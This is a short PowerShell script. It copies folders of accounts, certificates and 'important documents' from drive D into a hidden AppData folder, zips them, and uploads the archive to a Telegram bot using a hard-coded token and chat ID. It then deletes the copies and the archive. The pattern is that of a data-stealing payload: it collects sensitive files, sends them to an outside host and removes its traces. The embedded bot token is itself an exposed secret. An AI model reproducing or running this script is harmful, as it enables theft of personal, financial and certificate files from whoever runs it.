New-Item -Path "C:\Users\crism\AppData\Local\send" -ItemType Directory -Force

Copy-Item -Path "D:\CONTAS" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse
Copy-Item -Path "D:\Certificados" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse 
Copy-Item -Path "D:\Documentos Importantes" -Destination "C:\Users\crism\AppData\Local\send" -Force -Recurse

Compress-Archive -Path "C:\Users\crism\AppData\Local\send" -DestinationPath "C:\Users\crism\AppData\Local\send.zip" -Force

$zipPath = "C:\Users\crism\AppData\Local\send.zip"
$token = "8438311215:AAG4JFC3Lkqx2l6Cx3nQZmmnpU6Fn_sbHgE"
$chatId  = "5757392163"

$url = "https://api.telegram.org/bot$token/sendDocument"

$form = @{
    chat_id = $chatId
    document = Get-Item $zipPath
}

Invoke-WebRequest -Uri $url -Method Post -Form $form

Remove-Item "C:\Users\crism\AppData\Local\send" -Recurse -Force
Remove-Item "C:\Users\crism\AppData\Local\send.zip" -Force
exit